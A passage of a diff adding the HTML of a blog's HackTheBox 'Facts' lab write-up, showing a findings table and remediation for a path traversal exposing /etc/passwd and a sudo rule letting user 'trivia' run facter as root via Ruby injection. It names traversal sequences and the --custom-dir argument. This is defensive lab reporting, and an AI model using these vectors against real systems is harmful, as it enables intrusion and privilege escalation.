+          <th style="text-align: center"><strong>Severity</strong></th>
+          <th style="text-align: center">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF3</td>
+          <td style="text-align: center">CWE-22: Inadequate Restriction of a Path Name to a Restricted Directory</td>
+          <td style="text-align: center"><span style="background-color: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     High 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">The private file download endpoint allows the use of <code>../</code>, exposing critical operating system files such as <code>/etc/passwd</code>.</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Immediate Actions</p>
+<blockquote>
+<ul>
+<li>Implement strict validation and sanitization of the <code>file</code> parameter, restricting special character sequences such as <code>../</code> and <code>%2e%2e%2f</code>.</li>
+<li>Verify that the entered absolute path requests files within allowed directories before processing the requested file.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p>Inadequate Management of Sudo Privileges</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerability</strong></th>
+          <th style="text-align: center"><strong>Severity</strong></th>
+          <th style="text-align: center">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF4</td>
+          <td style="text-align: center">CWE-269: Improper Privilege Handling</td>
+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Critical 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">A user with the <code>trivia</code> permission can execute the binary <code>facter</code> as <code>root</code>, allowing Ruby code injection and thus executing commands as an administrator.</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Immediate Actions</p>
+<blockquote>
+<ul>
+<li>Remove the binary <code>facter</code> from the passwordless execution permissions directives for the user <code>trivia</code> in the file <code>/etc/sudoers</code>.</li>
+<li>If execution is part of the business logic, create an intermediary <code>wrapper</code> that limits and validates arguments entered by the user <code>trivia</code> to prevent dangerous arguments such as <code>--custom-dir</code>.</li>
+<li>Periodically audit the configuration file <code>sudoers</code>, verifying that the principle of least privilege is followed.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+
+  </div><div class="border-top pt-4 mt-4">
+    <p class="f5 text-bold mb-2">Share</p>
+    <div class="d-flex flex-wrap" style="gap: 0.5rem;">
+      <a href="https://twitter.com/intent/tweet?text=WriteUp%3A&#43;Facts&#43;%7C&#43;HTB&url=https%3A%2F%2Fmaxisfront.me%2Fposts%2Fwriteup-facts-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+        </svg>
+        X
+      </a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmaxisfront.me%2Fposts%2Fwriteup-facts-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"></path>
+        </svg>
+        Facebook
+      </a>
+      <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmaxisfront.me%2Fposts%2Fwriteup-facts-htb%2F&title=WriteUp%3A&#43;Facts&#43;%7C&#43;HTB" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"></path>
+        </svg>
+        LinkedIn
+      </a>
+      <a href="https://bsky.app/intent/compose?text=WriteUp%3A&#43;Facts&#43;%7C&#43;HTB%20https%3A%2F%2Fmaxisfront.me%2Fposts%2Fwriteup-facts-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M3.468 1.948C5.303 3.325 7.276 6.118 8 7.616c.724-1.498 2.697-4.29 4.532-5.668C13.855.955 16 .186 16 2.632c0 .489-.28 4.105-.444 4.692-.572 2.04-2.653 2.561-4.504 2.246 3.236.551 4.06 2.375 2.281 4.2-3.376 3.464-4.852-.872-5.23-1.988-.07-.205-.103-.3-.103-.218 0-.081-.033.013-.103.218-.378 1.116-1.854 5.452-5.23 1.988-1.778-1.825-.955-3.649 2.28-4.2-1.85.315-3.93-.205-4.503-2.246C.28 6.737 0 3.12 0 2.632 0 .186 2.145.955 3.468 1.948"></path>
+        </svg>
+        Bluesky
+      </a>
+    </div>
+  </div><div class="border-top pt-4 mt-4">
+    <h2 class="f4 mb-3">Related Posts</h2>
+    <div class="d-flex flex-column flex-md-row"><div class="flex-1 mb-3 mb-md-0 mr-md-3">
+        <a href="/posts/writeup-dc-2-vulnhub/" class="Link--primary text-bold">WriteUp: DC-2 | VulnHub</a><p class="color-fg-muted f6 mb-0">
+          2026-03-25
+        </p></div><div class="flex-1 mb-3 mb-md-0 mr-md-3">
+        <a href="/posts/writeup-conversor-htb/" class="Link--primary text-bold">WriteUp: Conversor | HTB</a><p class="color-fg-muted f6 mb-0">
+          2026-05-24
+        </p></div><div class="flex-1 mb-3 mb-md-0 mr-md-3">
+        <a href="/posts/writeup-dc-1-vulnhub/" class="Link--primary text-bold">WriteUp: DC-1 | VulnHub</a><p class="color-fg-muted f6 mb-0">
+          2026-03-16
+        </p></div></div>
+  </div><nav class="border-top pt-4 mt-4">
+    <div class="d-flex flex-justify-between"><a href="/posts/writeup-conversor-htb/" class="Link--secondary">
+        &larr; WriteUp: Conversor | HTB
+      </a></div>
+  </nav>
+</article>
+          </div>
+          <div class="Layout-sidebar"><aside><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">Recent Posts</h3>
+  <ul class="list-style-none"><li class="mb-2">
+      <a href="/posts/writeup-facts-htb/" class="Link--primary">WriteUp: Facts | HTB</a><span class="color-fg-muted f6 d-block">
+        2026-07-11
+      </span></li><li class="mb-2">
+      <a href="/posts/writeup-conversor-htb/" class="Link--primary">WriteUp: Conversor | HTB</a><span class="color-fg-muted f6 d-block">
+        2026-05-24
+      </span></li><li class="mb-2">
+      <a href="/posts/writeup-dc-2-vulnhub/" class="Link--primary">WriteUp: DC-2 | VulnHub</a><span class="color-fg-muted f6 d-block">
+        2026-03-25
+      </span></li><li class="mb-2">
+      <a href="/posts/writeup-dc-1-vulnhub/" class="Link--primary">WriteUp: DC-1 | VulnHub</a><span class="color-fg-muted f6 d-block">
+        2026-03-16
+      </span></li></ul>
+</div><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">Links</h3>
+  <div class="d-flex flex-wrap">
+    
+    <a href="https://github.com/MaxisFront" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="GitHub">
+      <svg class="octicon" viewBox="0 0 16 16" width="16" height="16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+    </a>
+
+    <a href="https://app.hackthebox.com/public/users/1716295" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="HackTheBox">
+      <svg class="octicon" viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z"/></svg>
+    </a>
+
+    <a href="https://www.linkedin.com/in/brandon-s%C3%A1nchez-roblero-a64987282/" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="LinkedIn">
+      <svg class="octicon" viewBox="0 0 512 509.64" width="16" height="16" fill="currentColor"><path d="M204.97 197.54h64.69v33.16h.94c9.01-16.16 31.04-33.16 63.89-33.16 68.31 0 80.94 42.51 80.94 97.81v116.92h-67.46l-.01-104.13c0-23.81-.49-54.45-35.08-54.45-35.12 0-40.51 25.91-40.51 52.72v105.86h-67.4V197.54zm-38.23-65.09c0 19.36-15.72 35.08-35.08 35.08-19.37 0-35.09-15.72-35.09-35.08 0-19.37 15.72-35.08 35.09-35.08 19.36 0 35.08 15.71 35.08 35.08zm-70.17 65.09h70.17v214.73H96.57V197.54z"></path></svg>
+    </a>
+
+  </div>
+</div>
+
+
+<div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">
+    <a href="/tags/" class="Link--primary">Tags</a>
+  </h3>
+  <div class="sidebar-collapsible d-flex flex-wrap" style="gap: 0.5rem;"
+    data-max-height="150"
+    data-view-all="/tags/"
+    data-label-more="Show more"
+    data-label-less="Show less"
+    data-label-view-all="View all"><a href="/tags/caido/" class="topic-tag">
+      caido
+    </a><a href="/tags/cewl/" class="topic-tag">
+      cewl
+    </a><a href="/tags/cms/" class="topic-tag">
+      cms
+    </a><a href="/tags/cve-2018-7600/" class="topic-tag">
+      cve-2018-7600
+    </a><a href="/tags/cve-2024-46987/" class="topic-tag">
+      cve-2024-46987
+    </a><a href="/tags/cve-2024-48990/" class="topic-tag">
+      cve-2024-48990
+    </a><a href="/tags/cve-2025-2304/" class="topic-tag">
+      cve-2025-2304
+    </a><a href="/tags/drupal/" class="topic-tag">
+      drupal
+    </a><a href="/tags/facter/" class="topic-tag">
+      facter
+    </a><a href="/tags/gftobins/" class="topic-tag">
+      gftobins
+    </a><a href="/tags/git/" class="topic-tag">
+      git
+    </a><a href="/tags/gtfobins/" class="topic-tag">
+      gtfobins
+    </a><a href="/tags/linux/" class="topic-tag">
+      linux
+    </a><a href="/tags/path-traversal/" class="topic-tag">
+      path-traversal
+    </a><a href="/tags/s3/" class="topic-tag">
+      s3
+    </a><a href="/tags/suid/" class="topic-tag">
+      suid
+    </a><a href="/tags/web/" class="topic-tag">
+      web
+    </a><a href="/tags/wordpress/" class="topic-tag">
+      wordpress
+    </a></div>
+</div>
+<div class="sidebar-module-toc"> <div class="Box Box--condensed mb-3">
+      <div class="Box-header">
+        <h3 class="Box-title">ToC</h3>
+      </div>
+      <div class="Box-body toc-sidebar">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#vulnerability-assesment-and-analysis">Vulnerability Assesment and Analysis</a>
+      <ul>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+        <li><a href="#port-enumeration">Port Enumeration</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#web-cve-2025-2304">Web: CVE-2025-2304</a></li>
+        <li><a href="#web-cve-2024-46987">Web: CVE-2024-46987</a></li>
+        <li><a href="#ssh">SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#impact">Impact</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#findings">Findings</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+    </div>
+</div>
+
+</aside></div>
+        </div></div>
+    </main><footer class="color-bg-subtle border-top py-6 mt-6">
+  <div class="container-xl px-3 px-md-4 px-lg-5">
+    <div class="d-flex flex-column flex-md-row flex-justify-between flex-items-center">
+      <div class="mb-3 mb-md-0">
+        <p class="color-fg-muted mb-0">
+          &copy; 2026 MaxisFront.</p>
+      </div><nav class="d-flex flex-wrap" aria-label="Footer navigation"><a href="/privacy/" class="Link--secondary px-2">Privacy</a></nav><div class="d-flex flex-items-center"><a href="https://github.com/MaxisFront" class="Link--secondary px-2" aria-label="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+          </svg>
+        </a><a href="https://x.com/MaxisFront" class="Link--secondary px-2" aria-label="X">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+          </svg>
+        </a></div></div>
+
+    <p class="color-fg-muted f6 mt-4 text-center">
+      Powered by
+      <a href="https://github.com/ngs/hugo-primer-blog" class="Link--secondary">Hugo Primer Blog</a>
+    </p>
+  </div>
+</footer>
+</div><script src="/js/theme-switcher.min.7378bbae7a4bc4b974611d68fe84197c86faf4bb09e4744c2789f4bd36159a0b.js" integrity="sha256-c3i7rnpLxLl0YR1o/oQZfIb69LsJ5HRMJ4n0vTYVmgs="></script><script src="/js/sidebar.min.8d897965d82e39784b4da02d345c06f44ecdff6252fcf44c20eeb421f1027114.js" integrity="sha256-jYl5ZdguOXhLTaAtNFwG9E7N/2JS/PRMIO60IfECcRQ="></script>
+</body>
+</html>
